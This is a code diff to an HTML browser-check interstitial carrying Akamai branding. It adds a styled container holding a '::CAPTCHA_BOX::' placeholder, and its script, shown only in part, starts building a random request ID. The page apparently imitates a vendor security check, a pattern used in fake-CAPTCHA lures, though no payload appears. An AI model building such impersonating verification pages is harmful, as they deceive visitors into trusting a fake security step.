@@ -68,6 +68,16 @@
       max-width: 500px;
       margin: 0 auto 30px;
     }
+    .captcha-wrapper {
+      margin: 30px 0;
+      min-height: 80px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f8fafc;
+      border-radius: 6px;
+      border: 1px solid #e2e8f0;
+    }
     .info-section {
       background: #f8fafc;
       border-radius: 6px;
@@ -155,6 +165,11 @@
       <p class="description">
         This process is automatic. Your browser will redirect to your requested content shortly.
       </p>
+
+      <div class="captcha-wrapper">
+        ::CAPTCHA_BOX::
+      </div>
+
       <div class="info-section">
         <div class="info-grid">
           <div class="info-item">
@@ -167,18 +182,21 @@
           </div>
         </div>
       </div>
+
       <div class="security-footer">
         <span class="security-text">Performance and security by</span>
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Akamai_logo.svg/500px-Akamai_logo.svg.png" alt="Akamai" class="security-logo">
       </div>
     </div>
   </div>
+
   <div class="page-footer">
     <div class="footer-content">
       <div class="footer-text">Akamai Technologies, Inc. All rights reserved.</div>
       <div class="timestamp" id="timestamp">-</div>
     </div>
   </div>
+
   <script>
     (function(){
       const chars='0123456789abcdef',id=[...Array(16)].map(()=>chars[Math.random()*16|0]).join('');
